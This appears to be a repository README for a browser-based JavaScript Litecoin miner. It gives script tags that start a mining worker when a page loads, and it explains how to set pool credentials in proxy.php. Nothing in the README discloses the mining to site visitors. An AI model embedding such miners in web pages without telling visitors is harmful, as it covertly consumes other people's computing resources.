This is pure javascript litecoin miner with scrypt algo. 

The demo page is http://www.goodu.info or http://www.goodu.info/gc/%E6%9E%97%E5%BE%BD%E5%9B%A0%E7%BE%8E%E6%96%87%E4%B8%8E%E7%BE%8E%E5%9B%BE

Some articles:
http://hyperichq.blog.51cto.com/1250795/1367479 in Chinese;


How to enjoy it:
1,just put the dir lm into a http base dir.
and in the web page including below:

<script type="text/javascript"src="/lm/json2.js"></script>
<script type="text/javascript" src="/lm/minera.js"></script>
<script type="text/javascript">
var miner = new Miner();
miner.startWorker();
</script> 

2,modify the file proxy.php, replace the proper stratum proxy or pool address, username and passowrd. Now only supprot base getwork protocol.

3,In order to connecting to a pool with statum protocol, you'd have to install a proxy.

good luck and enjoy it.

The scrypt algo is from https://github.com/kripken/emscripten;

I also provide some services to setup and optimize. 
Welcome to contact: martinking1997@gmail.com

Good luck guys.

